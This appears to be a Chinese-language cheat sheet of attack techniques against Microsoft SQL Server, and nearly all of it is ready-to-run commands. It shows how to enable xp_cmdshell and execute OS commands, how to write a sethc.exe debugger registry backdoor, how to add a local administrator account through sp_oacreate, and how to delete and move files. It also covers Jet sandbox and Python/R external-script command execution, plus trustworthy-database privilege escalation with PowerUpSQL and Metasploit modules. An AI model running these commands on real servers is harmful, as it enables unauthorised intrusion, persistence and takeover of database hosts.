  #### 开启xp_cmdshell
	#exec sp_configure 'show advanced options', 1;reconfigure; 
	#exec sp_configure 'xp_cmdshell',1;reconfigure;
	#exec master.dbo.xp_cmdshell 'ipconfig'
  ##### xp_regwrite
	xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\taskmgr.exe'
  ##### xp_dirtree
	execute master..xp_dirtree 'c:' //列出所有c:\文件和目录,子目录 
	execute master..xp_dirtree 'c:',1 //只列c:\文件夹 
	execute master..xp_dirtree 'c:',1,1 //列c:\文件夹加文件 
  ##### sp_oacreate
	exec sp_configure 'show advanced options', 1;RECONFIGURE;
	exec sp_configure 'Ola Automation Procedures' , 1;RECONFIGURE;
	执行命令
	declare @shell int 
	exec sp_oacreate 'wscript.shell',@shell output 
	exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 123 123 /add'
	declare @shell int 
	exec sp_oacreate 'wscript.shell',@shell output 
	exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 123/add'
	删除文件
	declare @result int
	declare @fso_token int
	exec sp_oacreate 'scripting.filesystemobject', @fso_token out
	exec sp_oamethod @fso_token,'deletefile',null,'c:\1.txt'
	exec sp_oadestroy @fso_token
	复制文件
	declare @o int
	exec sp_oacreate 'scripting.filesystemobject',@o out
	exec sp_oamethod @o,'copyfile',null,'c:\1.txt','c:\2.txt'
	移动文件
	declare @o int
	exec sp_oacreate 'scripting.filesystemobject',@o out
	exec sp_oamethod @o,'movefile',null,'c:\1.txt','c:\2.txt'
  ##### 沙盒执行
	开启沙盒：
	>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
	执行：
	>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
  ##### PowerupSQL
  	>Get-SQLServerLinkCrawl -Username sa -Password Password@ 1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')"
  #### 滥用trustworthy权限提升
  	查询当前用户trustworthy状态，trustworthy的值为 1，表示已激活。
	>select name,is_trustworthy_on from sys.databases
	也可使用PowerupSQL查询
	>Import-Module .\PowerUpSQL.ps1
	>Invoke-SQLAuditPrivTrustworthy -Username name -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Verbose
	提权
	>Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
	>Invoke-SqlServer-Escalate-DbOwner -SqlUser name -SqlPass Password@1 -SqlServerInstance WIN-P83OS778EQK\SQLEXPRESS
	或使用msf来提权
	>use auxiliary/admin/mssql_escalate_dbowner
	>set rhosts 192.168.1.146
	>set username name
	>set password Password@1
	>exploit
	提权成功后获取会话
	>use exploit/windows/mssql/mssql_payload
	>set rhosts 192.168.1.146
	>set username name
	>set password Password@1
	>exploit
  #### 启用外部脚本执行命令
	查看服务器是否启用
	sp_configure 'external scripts enabled'
	GO
  	当maximum，config_value，run_value为1时则确认启动
	执行python
	>EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("ipconfig"))'
	执行R Script
	>EXEC sp_execute_external_script
	>@language=N'R',
	>@script=N'OutputDataSet <- data.frame(system("cmd.exe /c ipconfig",intern=T))'
	>WITH RESULT SETS (([cmd_out] text));
	>GO
